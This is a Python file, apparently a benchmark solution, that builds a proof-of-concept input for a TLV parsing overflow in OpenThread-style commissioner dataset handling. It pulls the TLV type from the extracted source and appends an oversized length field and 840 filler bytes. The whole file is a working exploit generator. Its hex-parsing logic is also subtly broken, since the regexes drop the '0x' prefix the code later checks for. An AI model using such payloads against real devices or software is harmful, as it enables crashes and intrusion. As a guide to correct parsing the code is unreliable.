import tarfile
import tempfile
import os
import re

class Solution:
    def _find_tlv_type(self, extracted_path):
        patterns = [
            r'#define\s+COMMISSIONER_DATASET_TLV\s+0x([0-9A-Fa-f]+)',
            r'#define\s+OT_NETWORK_DATA_TLV_COMMISSIONER_DATASET\s+0x([0-9A-Fa-f]+)',
            r'#define\s+OT_NETWORK_DATA_TYPE_COMMISSIONING\s+0x([0-9A-Fa-f]+)',
            r'kCommissionerDatasetTlv\s*=\s*0x([0-9A-Fa-f]+)',
            r'kTypeCommissioning\s*=\s*0x([0-9A-Fa-f]+)',
            r'#define\s+COMMISSIONER_DATASET_TLV\s+(\d+)',
            r'#define\s+OT_NETWORK_DATA_TLV_COMMISSIONER_DATASET\s+(\d+)',
            r'#define\s+OT_NETWORK_DATA_TYPE_COMMISSIONING\s+(\d+)',
            r'kCommissionerDatasetTlv\s*=\s*(\d+)',
            r'kTypeCommissioning\s*=\s*(\d+)',
        ]
        for root, dirs, files in os.walk(extracted_path):
            for file in files:
                if file.endswith(('.h', '.hpp', '.cpp', '.cc', '.c')):
                    path = os.path.join(root, file)
                    try:
                        with open(path, 'r', errors='ignore') as f:
                            content = f.read()
                            for pattern in patterns:
                                matches = re.findall(pattern, content, re.IGNORECASE)
                                if matches:
                                    val = matches[0]
                                    if val.startswith('0x'):
                                        return int(val, 16)
                                    else:
                                        return int(val)
                    except:
                        continue
        return None

    def solve(self, src_path: str) -> bytes:
        try:
            with tempfile.TemporaryDirectory() as tmpdir:
                with tarfile.open(src_path, 'r') as tar:
                    tar.extractall(path=tmpdir)
                
                tlv_type = self._find_tlv_type(tmpdir)
                if tlv_type is None:
                    tlv_type = 0x01
                
                value = b'A' * 840
                length_field = b'\xFF' + (0xFFFF).to_bytes(2, 'big')
                poc = bytes([tlv_type]) + length_field + value
                
                if len(poc) != 844:
                    needed_value_len = 844 - 1 - 3
                    value = b'A' * needed_value_len
                    poc = bytes([tlv_type]) + length_field + value
                
                return poc
        except:
            tlv_type = 0x01
            value = b'A' * 840
            length_field = b'\xFF\xFF\xFF'
            poc = bytes([tlv_type]) + length_field + value
            return poc